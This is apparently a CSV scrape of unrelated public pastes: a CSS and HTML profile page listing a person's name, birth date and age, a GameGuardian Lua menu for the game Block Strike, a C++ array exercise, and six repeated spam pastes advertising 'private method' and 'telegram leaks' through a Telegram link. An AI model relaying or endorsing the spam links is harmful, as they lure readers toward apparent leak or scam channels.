id,title,username,language,date,content
s6QnjA8S,profile_details.css,horozov86,CSS,Wednesday 14th of May 2025 07:00:44 AM CDT,"html, body {
    height: 100%;
    margin: 0;
    padding: 0;
    font-family: sans-serif;
    background: linear-gradient(#141e30, #243b55);
    color: #fff;
}

/* Основен контейнер */
.info-section {
    position: absolute;
    top: 50%;
    left: 50%;
    width: 400px;
    padding: 40px;
    transform: translate(-50%, -50%);
    background: rgba(0, 0, 0, 0.5);
    box-sizing: border-box;
    box-shadow: 0 15px 25px rgba(0, 0, 0, 0.6);
    border-radius: 10px;
}

/* Заглавие */
.info-section h1 {
    margin-bottom: 30px;
    text-align: center;
    font-size: 28px;
    color: #f4ec03;
}

/* Снимка на профила */
.profile-photo {
    text-align: center;
    margin-bottom: 20px;
}

.profile-photo img {
    width: 120px;
    height: 120px;
    border-radius: 50%;
    border: 3px solid #f4ec03;
    object-fit: cover;
}

/* Описание */
.description {
    font-size: 16px;
    margin-bottom: 10px;
    padding-left: 5px;
    border-left: 3px solid #f4ec03;
}

/* Бутони */
.buttons {
    margin-top: 30px;
    text-align: center;
    display: flex;
    justify-content: space-between;
}

.edit-button,
.delete-button {
    padding: 10px 20px;
    color: #f4ec03;
    font-size: 14px;
    text-decoration: none;
    text-transform: uppercase;
    border: 1px solid #f4ec03;
    border-radius: 5px;
    background: transparent;
    transition: all 0.3s ease;
    width: 45%;
    text-align: center;
}

.edit-button:hover,
.delete-button:hover {
    background-color: #f4ec03;
    color: #141e30;
    box-shadow: 0 0 10px #f4ec03;
}"
afrDJRDn,profile_details.html,horozov86,HTML 5,Wednesday 14th of May 2025 06:59:08 AM CDT,"
<!-- {% extends 'base.html' %} -->
<!-- {% load static %} -->

<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <title>Profile Details</title>
    <!-- <link rel=""stylesheet"" href=""{% static 'css/profile_details.css' %}""> -->
    <link rel=""stylesheet"" href=""css/profile_details.css""> <!-- Локален стил -->
</head>
<body>
    <div class=""info-section"">
        <h1>Profile Details</h1>

        <div class=""profile-photo"">
            <!-- {% if profile.profile_photo %} -->
            <!-- <img class=""car-img"" src=""{{ profile.profile_photo.url }}"" alt=""Profile Image"" /> -->
            <!-- {% else %} -->
            <img class=""car-img"" src=""images/default_profile_image.png"" alt=""Default Profile Image"" />
            <!-- {% endif %} -->
        </div>

        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">First name: Georgi</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">Last name: Horozov</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">Age: 39</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">Date of birth: 14-03-1986</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">Country: Bulgaria</p>
        
        <!-- <p class=""description"">Email: {{ profile.user.email }}</p> -->
        <p class=""description"">City: Bulgaria</p>

        <!-- <p class=""description"">Address: {{ profile.address }}</p> -->
        <p class=""description"">Address: 123 Main Street, Sofia</p>

        <!-- Action Buttons -->
        <div class=""buttons"">
            <!-- <a href=""{% url 'profile_update' pk=object.pk %}"" class=""edit-button"">Edit</a> -->
            <!-- <a href=""{% url 'profile_delete' pk=object.pk %}"" class=""delete-button"">Delete</a> -->
            <a href=""#"" class=""edit-button"">Edit</a>
            <a href=""#"" class=""delete-button"">Delete</a>
        </div>
    </div>

    <!-- Optional Form for Additional Actions -->
    <!-- Optional Form for Additional Actions -->
<!--     <form method=""post"" enctype=""multipart/form-data"">
        {% csrf_token %}
        {{ form.as_p }}
    </form>
    {% endblock %} -->
</body>
</html>"
19JL1NAG,❤️private mehtod TG,Haigorilla,JavaScript,Wednesday 14th of May 2025 06:57:04 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

IfJh0kxATA
"
uZBq5qV5,❤️private mehtod C4,lollooloolloll,JavaScript,Wednesday 14th of May 2025 06:47:47 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

WSSS24lg2s
"
1Hjz3Cmn,telegram leaks❤️ XU,lollooloolloll,JavaScript,Wednesday 14th of May 2025 06:41:04 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

FPvUIVCnmo
"
yAU5u4i1,❤️private mehtod XA,lollooloolloll,JavaScript,Wednesday 14th of May 2025 06:34:20 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

0KuwreoiyN
"
c7gJSbn5,telegram leaks❤️ 4G,lollooloolloll,JavaScript,Wednesday 14th of May 2025 06:27:37 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

vRSZFiGIsB
"
JBvVpkva,Download,Shiko5303,Lua,Wednesday 14th of May 2025 06:24:42 AM CDT,"    local choice = gg.choice({""Check current version Block Strike"", ""Back""}, nil, ""Chose:"")

    if choice == 1 then
        gg.sleep(1900)

        local versions = {""4391""}
        local links = {
            ""https://pastebin.com/raw/xyz123""
        }

        local versionChoice = gg.choice(versions, nil, ""Found: 1"")

        if versionChoice then
            local versionName = versions[versionChoice]
            local selectedLink = links[versionChoice]
            if gg.copyText then
                gg.copyText(selectedLink)
                gg.toast(""Link copied to clipboard."")
            end
            local filePath = ""/sdcard/Documents/Download"" .. versionName .. "".txt""
            local file = io.open(filePath, ""w"")
            if file then
                file:write(selectedLink)
                file:close()
            else
                gg.alert(""Failed to save file."")
            end
        else
            gg.toast(""No version selected."")
        end
    else
        gg.toast(""Back selected."")
    end"
0gxsfAbD,❤️private mehtod WE,lollooloolloll,JavaScript,Wednesday 14th of May 2025 06:20:55 AM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

CwdY6tH1Uo
"
mL1E1WvT,Untitled,dllbridge,C,Wednesday 14th of May 2025 06:18:21 AM CDT,"
#include   <iostream>
#include   <stdlib.h>
#include    <iomanip>
#include     <time.h>
using namespace  std;



const int B = 20, A = 20;
int foo(int* p);

/////////////////////////////////////////////////
int main()
{
    
	srand(time(0));
	int  array[B];
	int    mas[B];
	
	for(int i = 0; i < B; i++)
    {

		  mas[i] = rand() % 100 - 10;
		array[i] = rand() % 100 - 10;
		
		cout << "" "" << setw(3) << array[i] << ""   "" 
                    << setw(3) <<   mas[i] << endl;		
    }
    
	int v = foo(array);
	int g = foo(  mas);
	
	cout << "" array[i] ="" << v << endl;
	cout << ""   mas[i] ="" << g << endl;

	if(v < g)
	{
	//	cout << ""  foo(mas) = "" << foo(mas) << endl;
	//	if (g < foo(array))
	//	{
	//		cout << ""  foo(array)  =  "" << foo(array) << endl;
	//	}
		      cout << ""Win array"" << endl;
	}
	if(g < v) cout << ""Win   mas"" << endl;

	
/*           	cout << endl;
	for (int j = 0; j < B; j++) {

		mas[j] = rand() % 10;
		      
		cout << "" "" << mas[j];
	}*/
}


int foo(int* p)
{
	int i = 0;
	for (int i = 0; i < B; i++)
	{
		if (p[i] < 0)
		{
			return i;
		}
	
	}
	return -1;
 }
 
 
 
 "
